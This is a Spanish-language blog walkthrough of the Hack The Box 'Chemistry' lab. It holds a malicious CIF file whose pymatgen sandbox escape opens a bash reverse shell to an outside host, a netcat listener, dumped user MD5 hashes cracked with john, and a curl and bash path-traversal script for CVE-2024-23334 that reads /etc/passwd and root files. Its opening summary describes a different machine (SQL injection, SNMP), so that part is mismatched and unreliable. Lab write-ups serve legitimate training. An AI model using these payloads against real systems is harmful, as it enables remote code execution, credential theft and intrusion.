---
layout: single
title:  chemistry - Hack The Box
excerpt: "resumen de la maquina se necesito un escaneo y en pagina encontrar una Ejecución arbitraria de código y mandarnos una revershell y explotar CVE-2024-23334-PoC para escar privilegios"
date: 2024-12-04
classes: wide
header:
  teaser: /assets/images/htb-writeup-chemistry/chemy2-modified.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
  - infosec
tags:
  - snmp
  - sqli
  - john 
  - CVE-2024-23334-PoC
---

![](/assets/images/htb-writeup-chemistry/chemy2-modified.png)

Intense starts with code review of a flask application where we find an SQL injection vulnerability that we exploit with a time-based technique.  After retrieving the admin hash, we'll use a hash length extension attack to append the admin username and hash that we found in the database, while keeping the signature valid, then use a path traversal vulnerability to read the snmp configuration file. With the SNMP read-write community string we can execute commands with the daemon user. To escalate to root, we'll create an SNMP configuration file with the `agentUser` set to `root`, then wait for the SNMP daemon to restart to so we can execute commands as root.

## Portscan

sudo nmap -p- --open -sC -sV 10.10.11.38

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 b6:fc:20:ae:9d:1d:45:1d:0b:ce:d9:d0:20:f2:6f:dc (RSA)
|   256 f1:ae:1c:3e:1d:ea:55:44:6c:2f:f2:56:8d:62:3c:2b (ECDSA)
|_  256 94:42:1b:78:f2:51:87:07:3e:97:26:c9:a2:5c:0a:26 (ED25519)
5000/tcp open  upnp?
| fingerprint-strings:
|   GetRequest:
|     HTTP/1.1 200 OK
|     Server: Werkzeug/3.0.3 Python/3.9.5
|     Date: Sat, 19 Oct 2024 21:20:41 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 719
|     Vary: Cookie
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="UTF-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
|     <title>Chemistry - Home</title>
|     <link rel="stylesheet" href="/static/styles.css">
|     </head>
|     <body>
|     <div class="container">
|     class="title">Chemistry CIF Analyzer</h1>
|     <p>Welcome to the Chemistry CIF Analyzer. This tool allows you to upload a CIF (Crystallographic Information File) and analyze the structural data contained within.</p>
|     <div class="buttons">
|     <center><a href="/login" class="btn">Login</a>
|     href="/register" class="btn">Register</a></center>
|     </div>
|     </div>
|     </body>
|   RTSPRequest:
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
|     "http://www.w3.org/TR/html4/strict.dtd">
|     <html>
|     <head>
|     <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request version ('RTSP/1.0').</p>
|     <p>Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.</p>
|     </body>
|_    </html>
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port5000-TCP:V=7.94SVN%I=7%D=10/19%Time=671422A8%P=aarch64-unknown-linu
SF:x-gnu%r(GetRequest,38A,"HTTP/1\.1\x20200\x20OK\r\nServer:\x20Werkzeug/3
SF:\.0\.3\x20Python/3\.9\.5\r\nDate:\x20Sat,\x2019\x20Oct\x202024\x2021:20
SF::41\x20GMT\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-L
SF:ength:\x20719\r\nVary:\x20Cookie\r\nConnection:\x20close\r\n\r\n<!DOCTY
SF:PE\x20html>\n<html\x20lang=\"en\">\n<head>\n\x20\x20\x20\x20<meta\x20ch
SF:arset=\"UTF-8\">\n\x20\x20\x20\x20<meta\x20name=\"viewport\"\x20content
SF:=\"width=device-width,\x20initial-scale=1\.0\">\n\x20\x20\x20\x20<title
SF:>Chemistry\x20-\x20Home</title>\n\x20\x20\x20\x20<link\x20rel=\"stylesh
SF:eet\"\x20href=\"/static/styles\.css\">\n</head>\n<body>\n\x20\x20\x20\x
SF:20\n\x20\x20\x20\x20\x20\x20\n\x20\x20\x20\x20\n\x20\x20\x20\x20<div\x2
SF:0class=\"container\">\n\x20\x20\x20\x20\x20\x20\x20\x20<h1\x20class=\"t
SF:itle\">Chemistry\x20CIF\x20Analyzer</h1>\n\x20\x20\x20\x20\x20\x20\x20\
SF:x20<p>Welcome\x20to\x20the\x20Chemistry\x20CIF\x20Analyzer\.\x20This\x2
SF:0tool\x20allows\x20you\x20to\x20upload\x20a\x20CIF\x20\(Crystallographi
SF:c\x20Information\x20File\)\x20and\x20analyze\x20the\x20structural\x20da
SF:ta\x20contained\x20within\.</p>\n\x20\x20\x20\x20\x20\x20\x20\x20<div\x
SF:20class=\"buttons\">\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<
SF:center><a\x20href=\"/login\"\x20class=\"btn\">Login</a>\n\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20<a\x20href=\"/register\"\x20class=\"b
SF:tn\">Register</a></center>\n\x20\x20\x20\x20\x20\x20\x20\x20</div>\n\x2
SF:0\x20\x20\x20</div>\n</body>\n<")%r(RTSPRequest,1F4,"<!DOCTYPE\x20HTML\
SF:x20PUBLIC\x20\"-//W3C//DTD\x20HTML\x204\.01//EN\"\n\x20\x20\x20\x20\x20
SF:\x20\x20\x20\"http://www\.w3\.org/TR/html4/strict\.dtd\">\n<html>\n\x20
SF:\x20\x20\x20<head>\n\x20\x20\x20\x20\x20\x20\x20\x20<meta\x20http-equiv
SF:=\"Content-Type\"\x20content=\"text/html;charset=utf-8\">\n\x20\x20\x20
SF:\x20\x20\x20\x20\x20<title>Error\x20response</title>\n\x20\x20\x20\x20<
SF:/head>\n\x20\x20\x20\x20<body>\n\x20\x20\x20\x20\x20\x20\x20\x20<h1>Err
SF:or\x20response</h1>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Error\x20code:\
SF:x20400</p>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Message:\x20Bad\x20reque
SF:st\x20version\x20\('RTSP/1\.0'\)\.</p>\n\x20\x20\x20\x20\x20\x20\x20\x2
SF:0<p>Error\x20code\x20explanation:\x20HTTPStatus\.BAD_REQUEST\x20-\x20Ba
SF:d\x20request\x20syntax\x20or\x20unsupported\x20method\.</p>\n\x20\x20\x
SF:20\x20</body>\n</html>\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
http://10.10.11.38:5000

![](/assets/images/htb-writeup-chemistry/webs1.png)

`vemos que podemos subir un archivo .cif para poder interactuar con él. Después de un poco de investigación, encontré un PoC en GitHub
https://github.com/materialsproject/pymatgen/security/advisories/GHSA-vgv8-5cpj-qj2f`


```
data_Example
_cell_length_a    10.00000
_cell_length_b    10.00000
_cell_length_c    10.00000
_cell_angle_alpha 90.00000
_cell_angle_beta  90.00000
_cell_angle_gamma 90.00000
_symmetry_space_group_name_H-M 'P 1'
loop_
 _atom_site_label
 _atom_site_fract_x
 _atom_site_fract_y
 _atom_site_fract_z
 _atom_site_occupancy


 H 0.00000 0.00000 0.00000 1
 O 0.50000 0.50000 0.50000 1

_space_group_magn.transform_BNS_Pp_abc  'a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+["__sub" + "classes__"]) () if d.__name__ == "BuiltinImporter"][0].load_module ("os").system ("/bin/bash -c \'sh -i >& /dev/tcp/10.10.11.220/1010 0>&1\'");0,0,0'
_space_group_magn.number_BNS  62.448
_space_group_magn.name_BNS  "P  n'  m  a'  "
```

## /bin/bash -c \'sh -i >& /dev/tcp/10.10.11.220/1010 0>&1\' lo modificamos a nuestras nececidades

```
nc -lvnp 1425                         
listening on [any] 1425 ...
connect to [10.10.14.12] from (UNKNOWN) [10.10.11.38] 39028
app@chemistry:~$
```

```
app@chemistry:~/instance$ sqlite3 database.db
sqlite3 database.db
SELECT * FROM user;
1|admin|2861debaf8d99436a10ed6f75a252abf
2|app|197865e46b878d9e74a0346b6d59886a
3|rosa|63ed86ee9f624c7b14f1d4f43dc251a5
4|robert|02fcf7cfc10adc37959fb21f06c6b467
5|jobert|3dec299e06f7ed187bac06bd3b670ab2
6|carlos|9ad48828b0955513f7cf0f7f6510c8f8
7|peter|6845c17d298d95aa942127bdad2ceb9b
8|victoria|c3601ad2286a4293868ec2a4bc606ba3
9|tania|a4aa55e816205dc0389591c9f82f43bb
10|eusebio|6cad48078d0241cca9a7b322ecd073b3
11|gelacia|4af70c80b68267012ecdac9a7e916d18
12|fabian|4e5d71f53fdd2eabdbabb233113b5dc0
13|axel|9347f9724ca083b17e39555c36fd9007
14|kristel|6896ba7b11a62cacffbdaded457c6d92
15|nano|1657ec96792937f71c20c9e1bdc2300f
16|kali|d6ca3fd0c3a3b462ff2b83436dda495e
17|a|0cc175b9c0f1b6a831c399e269772661
18|mj|007de96adfa8b36dc2c8dd268d039129
19|123|202cb962ac59075b964b07152d234b70
20|test1|5a105e8b9d40e1329780d62ea2265d8a
21|tim|81dc9bdb52d04dc20036dbd8313ed055
22|test|098f6bcd4621d373cade4e832627b4f6
23|1234|81dc9bdb52d04dc20036dbd8313ed055
24|abc|900150983cd24fb0d6963f7d28e17f72
```

```
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt  --format=Raw-MD5
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 256/256 AVX2 8x3])
Press 'q' or Ctrl-C to abort, almost any other key for status
unicorniosrosados (?)     
1g 0:00:00:00 DONE (2025-01-22 19:50) 2.857g/s 8519Kp/s 8519Kc/s 8519KC/s unihmaryanih..unicornios2805
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed.
```

rosa@10.10.11.38

## escapalda de privilegios
analizando un poco mas el sistema y haciendo un fuzing y analizando los poc todos atacan `statics` les dejo como tarea investigar y analizar el cve CVE-2024-23334-PoC
pero para ser mas claro `curl -s --path-as-is "http://127.0.0.1:8000/assets/../../../../../root/root.txt"` podemos leer el archivo que e puesto tambien cuando busque el cve por el navegador encontre este repositorio en github que hace lo mismo pero lo automatiza `https://github.com/z3rObyte/CVE-2024-23334-PoC`

```
#!/bin/bash

url="http://localhost:8081"
string="../"
payload="/static/"
file="etc/passwd" # without the first /

for ((i=0; i<15; i++)); do
    payload+="$string"
    echo "[+] Testing with $payload$file"
    status_code=$(curl --path-as-is -s -o /dev/null -w "%{http_code}" "$url$payload$file")
    echo -e "\tStatus code --> $status_code"
    
    if [[ $status_code -eq 200 ]]; then
        curl -s --path-as-is "$url$payload$file"
        break
    fi
done
```
![](/assets/images/htb-writeup-chemistry/root.png)







`ssh -i root root@10.10.11.38`
